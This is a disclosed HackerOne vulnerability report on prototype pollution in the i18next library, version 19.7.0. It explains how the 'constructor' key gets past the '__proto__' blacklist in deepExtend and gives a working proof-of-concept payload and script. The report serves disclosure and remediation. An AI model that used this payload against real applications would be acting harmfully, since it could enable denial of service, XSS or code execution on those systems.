# [i18next] Prototype pollution attack

## Report Details
- **Report ID**: 968355
- **URL**: https://hackerone.com/reports/968355
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-08-27T09:16:19.390Z
- **Disclosed**: 2021-04-26T20:52:07.700Z

## Reporter
- **Username**: 0b5cur17y
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a prototype pollution vulnerability in i18next.
It allows to modify the prototype of a base object, which may result in DoS, XSS, RCE, etc. depending on the way the library is used.

# Module

**module name:** i18next
**version:** 19.7.0
**npm page:** ` https://www.npmjs.com/package/i18next`

## Module Description

i18next is a very popular internationalization framework for browser or any other javascript environment (eg. node.js).

## Module Stats

Weekly downloads: 1,003,465

# Vulnerability

## Vulnerability Description

The i18next API provides a function `addResourceBundle` in [src/ResourceStore.js:79](https://github.com/i18next/i18next/blob/master/src/ResourceStore.js#L79) (see API docs [here](https://www.i18next.com/overview/api#addresourcebundle)).
It allows to set many translations at once. Optionally, it can process nested objects and overwrite existing translations.
For example, you can call `i18next.addResourceBundle('en', 'translations', { homepage: { title: 'The English Title'} }, true, true);` to set the key "homepage.title" to "The English Title", overwriting it if it existed before.

The function `addResourceBundle` uses a utility function `deepExtend` to process nested objects.
It is defined in [src/utils.js:84](https://github.com/i18next/i18next/blob/44c2e7621a7e07660433b27122281b50886a1caf/src/utils.js#L84).
This function attempts to guard against prototype pollution by blacklisting the property `__proto__`.
However, it does not blacklist the property `constructor`.

To pollute `Object` you could thus set a translation like `{ constructor: { prototype: { polluted: true } } }`.

For an application to be vulnerable, it has to use  `addResourceBundle` with attacker-controlled input passed into the `resources` argument.
Moreover, both arguments `deep` and `overwrite` must be set to `true`. 

## Steps To Reproduce:

To try it out quickly, you can just copy the function `deepExtend` from [src/utils.js:84](https://github.com/i18next/i18next/blob/44c2e7621a7e07660433b27122281b50886a1caf/src/utils.js#L84)
and use it to apply the above-mentioned payload  to an empty object, with the `overwrite` argument set to `true`.

The following self-contained code snipped exemplifies how to do it.
Copy and paste to a file "main.js" and run in "node main.js".
It will print "Object is polluted".

```
// -------------- deepExtend as defined in i18next -------------- 
function deepExtend(target, source, overwrite) {
  /* eslint no-restricted-syntax: 0 */
  for (const prop in source) {
    if (prop !== '__proto__') {
      if (prop in target) {
        // If we reached a leaf string in target or source then replace with source or skip depending on the 'overwrite' switch
        if (
          typeof target[prop] === 'string' ||
          target[prop] instanceof String ||
          typeof source[prop] === 'string' ||
          source[prop] instanceof String
        ) {
          if (overwrite) target[prop] = source[prop];
        } else {
          deepExtend(target[prop], source[prop], overwrite);
        }
      } else {
        target[prop] = source[prop];
      }
    }
  }
  return target;
}
// --------------------------------------------------------------- 

const translations = '{ "constructor": { "prototype": { "polluted": true} } }';  
const existingData = {};                         
                                                  
deepExtend(existingData, JSON.parse(translations), true)

if ({}.polluted)
    console.log("Object is polluted")
```

# Wrap up

Select Y or N for the following statements:

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

The vulnerability may result in DoS, XSS, RCE, etc. depending on the way the library is used.

## Attachments
No attachments
